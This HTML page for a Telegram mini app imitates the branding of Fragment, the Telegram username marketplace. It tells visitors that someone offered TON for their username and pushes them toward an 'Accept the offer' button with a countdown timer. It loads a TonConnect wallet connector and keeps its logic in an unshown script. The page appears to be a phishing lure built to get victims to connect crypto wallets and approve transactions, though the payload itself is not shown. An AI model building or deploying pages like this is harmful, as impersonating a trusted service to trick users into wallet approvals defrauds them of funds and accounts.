<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="format-detection" content="telephone=no">
    <title>Fragment - Offer</title>
    <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cpath d='M126.3 153.6L252 209.2c3.2 1.5 7.2 1.3 12.2-.9l123.8-54.8c6.6-2.4 2.9-9.8-2.3-9l-256.6-1.1c-7.2.3-9.2 7.5-2.8 10.2zM116.2 182.1l118.4 184c3.7 6 13.1 2.6 12.8-2.8l-.2-126.2c-.1-7.1-1.9-8.7-6.4-10.6l-118.4-52.7c-4.3-2.4-10.1 1.6-6.2 8.3zM267.5 234.8l.3 127c.1 8.5 8.6 10.1 13.5 2.9l102.9-159.4 2.2-3.4 1.9-2.9 10.8-16.6c3.3-5.5-1.9-11.8-9.7-8.1l-117.4 52.9c-.2.1-.4.2-.6.3-1.5.9-2.5 1.8-3 2.9-.7 1.2-.9 2.7-.9 4.5z' fill='%23fff'/%3E%3C/svg%3E" type="image/x-icon">
    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        :root {
            --text-color: #8794a1;
            --accent-color: #4db2ff;
            --accent-rgb: 77, 178, 255;
            --header-color: #fff;
            --bg-color: #1a2026;
            --bg-rgb: 26, 32, 38;
            --header-bg-color: rgba(33, 42, 51, 0.95);
            --table-bg-color: #212a33;
            --table-bg-rgb: 33, 42, 51;
            --table-text-color: #8c9aa9;
            --value-color: #fff;
            --field-bg-color: #242e38;
            --field-color: #fff;
            --field-placeholder-color: #8a98a6;
            --btn-primary-bg-color: #248bda;
            --btn-primary-bg-hover-color: #207cc2;
            --btn-default-bg-color: #293440;
            --btn-default-bg-hover-color: #3f4e60;
            --def-border-radius: 8px;
            --header-height: 72px;
            --danger-color: #ff5863;
            --warning-color: #ff9953;
            --success-color: #5aec8c;
        }
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, system-ui, sans-serif;
            font-variant-ligatures: none;
            -webkit-font-smoothing: antialiased;
            background: var(--bg-color);
            padding: 0 !important;
            margin: 0 !important;
            color: var(--text-color);
            font-size: 13px;
            line-height: 1.5;
            overflow-x: hidden !important;
            width: 100vw !important;
            max-width: 100vw !important;
        }
        a { color: var(--accent-color); text-decoration: none; }
        .mini-app-wrapper {
            max-width: 100vw !important;
            padding: 0 !important;
            margin: 0 !important;
            background: var(--bg-color);
            min-height: 100vh;
            position: relative;
            display: flex;
            flex-direction: column;
            overflow-x: hidden !important;
            width: 100% !important;
        }
        .tm-header {
            display: flex;
            flex-direction: column;
            margin: 0 !important;
            position: sticky;
            left: 0;
            right: 0;
            top: 0;
            z-index: 100;
            background-color: var(--header-bg-color);
            -webkit-backdrop-filter: blur(25px);
            backdrop-filter: blur(25px);
            height: auto;
            min-height: var(--header-height);
            padding: 6px 0 0 !important;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            touch-action: manipulation;
            gap: 4px;
            flex-shrink: 0;
            width: 100% !important;
            max-width: 100% !important;
            padding-left: 0 !important;
            padding-right: 0 !important;
        }
        .tm-header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 0 8px !important;
            margin: 0 !important;
        }
        .tm-header-logo {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }
        .tm-logo {
            display: inline-flex;
            padding: 8px 6px 8px 0;
            align-items: center;
            cursor: pointer;
        }
        .tm-logo-icon {
            width: 20px;
            height: 20px;
            padding: 4px;
            margin: -4px;
            box-sizing: content-box;
            background-image: url('data:image/svg+xml,%3Csvg height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M126.3 153.6L252 209.2c3.2 1.5 7.2 1.3 12.2-.9l123.8-54.8c6.6-2.4 2.9-9.8-2.3-9l-256.6-1.1c-7.2.3-9.2 7.5-2.8 10.2zM116.2 182.1l118.4 184c3.7 6 13.1 2.6 12.8-2.8l-.2-126.2c-.1-7.1-1.9-8.7-6.4-10.6l-118.4-52.7c-4.3-2.4-10.1 1.6-6.2 8.3zM267.5 234.8l.3 127c.1 8.5 8.6 10.1 13.5 2.9l102.9-159.4 2.2-3.4 1.9-2.9 10.8-16.6c3.3-5.5-1.9-11.8-9.7-8.1l-117.4 52.9c-.2.1-.4.2-.6.3-1.5.9-2.5 1.8-3 2.9-.7 1.2-.9 2.7-.9 4.5z" fill="%23fff"/%3E%3C/svg%3E');
            background-size: cover;
            background-position: 0 0;
            background-repeat: no-repeat;
            display: inline-block;
            vertical-align: top;
            pointer-events: none;
        }
        .tm-logo-text {
            width: 75px;
            height: 18px;
            background-image: url('data:image/svg+xml,%3Csvg height="53" viewBox="0 0 226 53" width="226" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="m23.84 48h6.82v-18.91h8.8v-6.2h-8.8v-12.09h11.22v-6.2h-18.04zm21.81 0h6.82v-18.6h2.36c3.1 0 4.28 1.3 4.28 5.33v7.94c0 3.53.24 4.21.62 5.33h6.94c-.68-1.61-.74-3.16-.74-5.27v-7.63c0-4.89-1.12-8.12-4.53-9.17v-.13c3.04-1.24 4.46-4.09 4.46-8.55v-2.67c0-6.69-3.03-9.98-10.1-9.98h-10.11zm6.82-24.8v-12.4h3.1c2.42 0 3.47 1.36 3.47 4.46v3.35c0 3.47-1.55 4.59-4.09 4.59zm16.86 24.8h6.32l1.24-8.49h7.75v-.13l1.24 8.62h6.82l-7.07-43.4h-9.23zm8.37-14.38l2.97-21.46h.13l3.04 21.46zm28.32 15c6.7 0 10.17-3.97 10.17-10.91v-14.2h-9.86v6.2h3.41v8.49c0 3.1-1.36 4.22-3.53 4.22s-3.53-1.12-3.53-4.22v-23.74c0-3.1 1.36-4.28 3.53-4.28s3.53 1.18 3.53 4.28v4.15h6.45v-3.72c0-6.94-3.47-10.91-10.17-10.91-6.69 0-10.16 3.97-10.16 10.91v22.82c0 6.94 3.47 10.91 10.16 10.91zm15.06-.62h5.95v-32.86h.13l4.96 32.86h5.7l4.96-32.86h.13v32.86h6.44v-43.4h-9.73l-4.34 31.06h-.12l-4.34-31.06h-9.74zm33.85 0h18.6v-6.2h-11.78v-13.33h9.36v-6.2h-9.36v-11.47h11.78v-6.2h-18.6zm22.99 0h6.08v-31.68h.12l8.18 31.68h7.01v-43.4h-6.08v25.98h-.12l-6.63-25.98h-8.56zm32.29 0h6.82v-37.2h7.13v-6.2h-21.08v6.2h7.13z" fill="%23fff"/%3E%3C/svg%3E');
            background-size: contain;
            background-position: left center;
            background-repeat: no-repeat;
            display: inline-block;
            vertical-align: top;
            pointer-events: none;
        }
        .tm-main {
            margin: 0 auto;
            width: 100%;
            max-width: 100%;
            padding: 76px 8px 20px !important;
            flex: 1;
            background: var(--bg-color);
        }
        .tm-section-header {
            display: flex;
            padding: 10px 0 8px;
            width: 100%;
            max-width: 100%;
            margin-left: auto;
            margin-right: auto;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 12px;
        }
        .tm-section-header-text {
            font-size: 22px;
            line-height: 26px;
            font-weight: bold;
            color: var(--header-color);
            margin: 0;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .tm-section-header-status {
            display: inline-block;
            font-size: 11px;
            line-height: 16px;
            font-weight: bold;
            padding: 3px 6px;
            margin: 5px 6px 1px;
            vertical-align: top;
            border-radius: 5px;
            white-space: nowrap;
            color: #5aec8c;
            background-color: rgba(90, 236, 140, .1);
        }
        .tm-section-box {
            background: var(--table-bg-color);
            border-radius: var(--def-border-radius);
            padding: 16px;
            margin-bottom: 16px;
        }
        .tm-bid-info-text {
            font-size: 14px; line-height: 1.5; margin-bottom: 16px; color: var(--text-color);
        }
        .tm-bid-info-text b { color: #fff; }
        .tm-bid-info-text a { color: var(--accent-color); text-decoration: none; }
        
        .tm-list-item {
            display: flex; justify-content: space-between;
            padding: 12px 0; border-top: 1px solid #1a2026;
            font-size: 14px;
        }
        .tm-list-item:first-child { border-top: none; padding-top: 0; }
        .tm-list-item-title { font-weight: bold; color: #fff; }
        .tm-list-item-value { color: var(--accent-color); }

        .tm-countdown {
            display: flex; align-items: center; justify-content: center;
            gap: 10px; font-size: 14px; font-weight: bold; color: #fff;
            padding: 10px 0;
        }
        .tm-countdown-timer { display: flex; gap: 4px; }
        .tm-timer-box {
            background: var(--bg-color); border-radius: 6px; padding: 6px 10px;
            font-size: 16px; color: #fff;
        }
        .tm-timer-sep { font-weight: bold; color: var(--text-color); }

        .btn-primary {
            display: block; width: 100%;
            background: var(--btn-primary-bg-color); color: #fff;
            border: none; border-radius: var(--def-border-radius);
            padding: 16px; font-size: 16px; font-weight: bold;
            text-align: center; cursor: pointer;
            transition: background .2s ease;
        }
        .btn-primary:hover { background: var(--btn-primary-bg-hover-color); }
        .btn-primary:disabled { opacity: 0.5; }
        
        #ton-connect { display: none; }
    </style>
</head>
<body>

    <div class="mini-app-wrapper">
        <header class="tm-header">
            <div class="tm-header-top">
                <div class="tm-header-logo">
                    <a href="#" class="tm-logo">
                        <i class="tm-logo-icon"></i>
                        <i class="tm-logo-text"></i>
                    </a>
                </div>
            </div>
        </header>

        <main class="tm-main">
            <!-- Заголовок -->
            <div class="tm-section-header">
                <h2 class="tm-section-header-text">
                    <span id="display-username">loading</span>.t.me
                    <span class="tm-section-header-status tm-status-avail">Claimed</span>
                </h2>
            </div>

            <!-- Блок с офером -->
            <div class="tm-section-box">
                <div class="tm-bid-info-text">
                    <b>What is this?</b><br><br>
                    Someone offered <span style="color:var(--accent-color); font-weight:bold;"><span id="display-price">0</span> TON</span> for your username. If the price suits you, press "Accept the offer".<br><br>
                    <a href="#">How does this work?</a>
                </div>

                <div class="tm-list-item">
                    <span class="tm-list-item-title">Telegram Username</span>
                    <span class="tm-list-item-value">@<span id="info-username">loading</span></span>
                </div>
                <div class="tm-list-item">
                    <span class="tm-list-item-title">Web Address</span>
                    <span class="tm-list-item-value">t.me/<span id="info-web">loading</span></span>
                </div>
                <div class="tm-list-item">
                    <span class="tm-list-item-title">TON Web 3.0 Address</span>
                    <span class="tm-list-item-value"><span id="info-ton">loading</span>.t.me</span>
                </div>
            </div>

            <!-- Таймер -->
            <div class="tm-section-box">
                <div class="tm-countdown">
                    <span>Ends in</span>
                    <div class="tm-countdown-timer">
                        <span class="tm-timer-box" id="t-days">0 days</span>
                        <span class="tm-timer-sep">:</span>
                        <span class="tm-timer-box" id="t-hours">00</span>
                        <span class="tm-timer-sep">:</span>
                        <span class="tm-timer-box" id="t-mins">00</span>
                        <span class="tm-timer-sep">:</span>
                        <span class="tm-timer-box" id="t-secs">00</span>
                    </div>
                </div>
            </div>

            <!-- Кнопка -->
            <button id="accept-btn" class="btn-primary" disabled>Loading...</button>
        </main>
    </div>

    <div id="ton-connect"></div>
    <script src="/app.js"></script>
</body>
</html>
